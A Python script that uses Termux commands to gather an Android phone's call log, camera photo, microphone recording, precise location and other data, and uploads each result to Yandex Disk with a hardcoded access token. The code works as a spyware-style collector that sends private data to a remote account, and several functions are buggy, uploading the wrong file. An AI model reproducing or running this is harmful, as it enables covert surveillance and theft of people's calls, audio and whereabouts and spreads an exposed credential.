import subprocess
import yadisk


def termux_battery_status():
    battery_status = subprocess.check_output(["termux-battery-status"])
    print(battery_status)
    f = open('termux-battery-status.json', 'wb')
    f.write(battery_status)
    f.close()
    y = yadisk.YaDisk(token="AgAAAAA6W2v0AAYAUV1byCjUVUDVonwETUOJYZ0")
    y.upload("termux-battery-status.json", "/termux-battery-status.txt")


def termux_call_log():
    call_log = subprocess.check_output(["termux-call-log"])
    print(call_log)
    f = open('termux-call-log.txt', 'wb')
    f.write(call_log)
    f.close()
    y = yadisk.YaDisk(token="AgAAAAA6W2v0AAYAUV1byCjUVUDVonwETUOJYZ0")
    y.upload("termux-battery-status.json", "/termux-battery-status.txt")


def termux_camera_info():
    camera_info = subprocess.check_output(["termux-camera-info"])
    print(camera_info)
    f = open('termux-camera-info.txt', 'wb')
    f.write(camera_info)
    f.close()
    y = yadisk.YaDisk(token="AgAAAAA6W2v0AAYAUV1byCjUVUDVonwETUOJYZ0")
    y.upload("termux-battery-status.json", "/termux-battery-status.txt")


def termux_camera_photo():
    camera_photo = subprocess.check_output(["termux-camera-photo"])
    print(camera_photo)
    f = open('termux-camera-photo.txt', 'wb')
    f.write(camera_photo)
    f.close()
    y = yadisk.YaDisk(token="AgAAAAA6W2v0AAYAUV1byCjUVUDVonwETUOJYZ0")
    y.upload("termux-camera-photo.txt", "/termux-camera-photo.txt")


def termux_download():
    download = subprocess.check_output(["termux-download"])
    print(download)
    f = open('termux-download.txt', 'wb')
    f.write(download)
    f.close()
    y = yadisk.YaDisk(token="AgAAAAA6W2v0AAYAUV1byCjUVUDVonwETUOJYZ0")
    y.upload("termux-download.txt", "/termux-download.txt")


def termux_microphone_record():
    microphone_record = subprocess.check_output(["termux-microphone-record",])
    print(microphone_record)
    f = open('termux_microphone_record.txt', 'wb')
    f.write(microphone_record)
    f.close()
    y = yadisk.YaDisk(token="AgAAAAA6W2v0AAYAUV1byCjUVUDVonwETUOJYZ0")
    y.upload("termux_microphone_record.txt", "/termux_microphone_record.txt")


def termux_location():
    location = subprocess.check_output(["termux-location", "-p", "-r"])
    print(location)
    f = open('termux-location.txt', 'wb')
    f.write(location)
    f.close()
    y = yadisk.YaDisk(token="AgAAAAA6W2v0AAYAUV1byCjUVUDVonwETUOJYZ0")
    y.upload("termux-location.txt", "/termux-location.txt")